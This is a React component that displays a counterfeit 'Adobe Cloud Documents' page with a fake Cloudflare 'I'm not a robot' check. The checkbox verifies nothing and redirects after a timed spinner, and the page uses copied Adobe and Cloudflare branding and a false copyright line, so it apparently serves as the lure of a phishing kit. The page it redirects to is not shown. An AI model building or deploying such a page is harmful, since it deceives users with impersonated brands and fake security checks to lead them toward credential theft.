import React, { useState, useCallback, useEffect } from 'react';

interface CloudflareCaptchaProps {
  onVerified: () => void;
  verificationDelay?: number;
  autoRedirectDelay?: number;
}

// Proper Cloudflare logo SVG
const CloudflareLogo = () => (
  <img
    src="https://static.cdnlogo.com/logos/c/93/cloudflare-thumb.png"
    alt="Cloudflare"
    className="w-14 h-14 object-contain brightness-110 contrast-125"
  />
);

// Reusable spinner component
const Spinner: React.FC<{ size?: 'sm' | 'md'; className?: string }> = ({
  size = 'md',
  className = ''
}) => {
  const sizeClasses = size === 'sm' ? 'w-3 h-3' : 'w-4 h-4';

  return (
    <div
      className={`${sizeClasses} border-2 border-blue-500 border-t-transparent rounded-full animate-spin ${className}`}
      aria-label="Loading"
    />
  );
};

const CloudflareCaptcha: React.FC<CloudflareCaptchaProps> = ({
  onVerified,
  verificationDelay = 1500,
  autoRedirectDelay = 500,
}) => {
  const [isChecked, setIsChecked] = useState(false);
  const [isVerifying, setIsVerifying] = useState(false);
  const [isVerified, setIsVerified] = useState(false);
  const [liveMessage, setLiveMessage] = useState<string>('');

  // Initialize the accessible live message and visible prompt text
  useEffect(() => {
    setLiveMessage('Please confirm the captcha to continue.');
  }, []);

  // When clicked, show spinner for the entire delay period, then redirect immediately
  const handleCheckboxClick = useCallback(() => {
    if (isVerified || isVerifying) return;

    setIsChecked(true);
    setIsVerifying(true);
    setLiveMessage('Verifying...');

    setTimeout(() => {
      setIsVerifying(false);
      setIsVerified(true);
      setLiveMessage('Verified. Redirecting...');
      setTimeout(() => {
        onVerified();
      }, 300);
    }, verificationDelay);
  }, [isVerified, isVerifying, onVerified, verificationDelay]);

  const handleKeyDown = useCallback((event: React.KeyboardEvent) => {
    if (event.key === 'Enter' || event.key === ' ') {
      event.preventDefault();
      handleCheckboxClick();
    }
  }, [handleCheckboxClick]);

  return (
    <div
      className="min-h-screen flex items-center justify-center p-6"
      style={{
        backgroundImage:
          "url('https://images.unsplash.com/photo-1618242537685-bdc08d6311b3?ixlib=rb-4.1.0&ixid=M3wxMjA3fDB8MHxwaG90by1wYWdlfHx8fGVufDB8fHx8fA%3D%3D&auto=format&fit=crop&q=80&w=1974')",
        backgroundSize: 'cover',
        backgroundPosition: 'center',
        backgroundRepeat: 'no-repeat'
      }}
    >
      {/* Semi-transparent centered card to ensure readability against the image */}
      <div className="w-full max-w-sm bg-white/80 backdrop-blur-sm rounded-2xl shadow-lg border border-white/30 overflow-hidden">
        {/* Comfortable header placement: centered, slightly elevated with breathing room */}
        <div className="px-6 pt-8 pb-4">
          <div className="text-center">
            <h1 className="text-xl md:text-2xl font-semibold text-slate-900 drop-shadow-sm">
              Welcome to Adobe Cloud Documents
            </h1>
            <p className="mt-2 text-sm md:text-sm text-slate-700 max-w-[88%] mx-auto">
              Work with PDFs wherever you are and securely access your documents.
            </p>
          </div>
        </div>

        {/* Visible prompt message (same logic as original prompt) */}
        <div className="px-5 pb-4">
          <div className="mb-3 px-3 py-2 rounded-md bg-white border border-gray-200 text-sm text-gray-700 shadow-sm">
            Please confirm the captcha below to continue.
          </div>

          {/* Accessible live region for screen readers */}
          <div className="sr-only" aria-live="polite">
            {liveMessage}
          </div>

          {/* Main verification area */}
          <div className="flex items-center space-x-3 mb-4">
            {/* Checkbox - real Cloudflare size */}
            <div
              className={`w-5 h-5 flex items-center justify-center border-2 rounded cursor-pointer transition-all duration-200 focus:outline-none focus:ring-1 focus:ring-blue-400 touch-manipulation ${
                isVerified
                  ? `bg-green-500 border-green-500`
                  : isVerifying
                  ? `border-blue-500 bg-blue-50`
                  : `border-gray-400 bg-white hover:border-gray-600 active:border-gray-700`
              }`}
              onClick={handleCheckboxClick}
              onKeyDown={handleKeyDown}
              tabIndex={0}
              role="checkbox"
              aria-checked={isVerified}
              aria-label="Verify you are human"
            >
              {isVerifying && <Spinner size="sm" />}
              {isVerified && (
                <svg
                  className="w-3 h-3 text-white"
                  fill="none"
                  viewBox="0 0 24 24"
                  stroke="currentColor"
                  strokeWidth={3}
                  aria-hidden="true"
                >
                  <path strokeLinecap="round" strokeLinejoin="round" d="M5 13l4 4L19 7" />
                </svg>
              )}
            </div>

            <span className="text-gray-800 text-sm select-none">I'm not a robot</span>
          </div>
        </div>

        {/* Footer: Cloudflare logo and text (Back button removed as requested) */}
        <div className="px-5 pb-6 pt-2 border-t border-white/40">
          <div className="flex items-center justify-between text-xs text-gray-500">
            <div className="flex items-center space-x-3">
              <div className="flex-shrink-0">
                <CloudflareLogo />
              </div>
              <div>Protected by Cloudflare</div>
            </div>

            <div className="text-right text-[11px] text-slate-600">
              {/* small subtle note to keep the look professional */}
              © {new Date().getFullYear()} Adobe Inc.
            </div>
          </div>
        </div>
      </div>
    </div>
  );
};

export default CloudflareCaptcha;
